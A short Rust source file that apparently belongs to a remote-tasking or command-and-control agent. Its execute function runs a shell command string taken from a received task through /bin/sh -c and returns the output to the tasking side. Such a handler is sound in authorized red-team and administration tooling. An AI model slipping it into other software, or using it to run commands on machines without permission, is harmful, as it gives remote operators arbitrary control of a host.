use crate::structs::Task;
use tokio::process::Command;

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let command_str = task.data.params.clone();

    match Command::new("/bin/sh")
        .arg("-c")
        .arg(&command_str)
        .output()
        .await
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            response.user_output = format!("{}{}", stdout, stderr);
            response.completed = true;
        }
        Err(e) => {
            response.set_error(&format!("Failed to execute shell command: {}", e));
        }
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
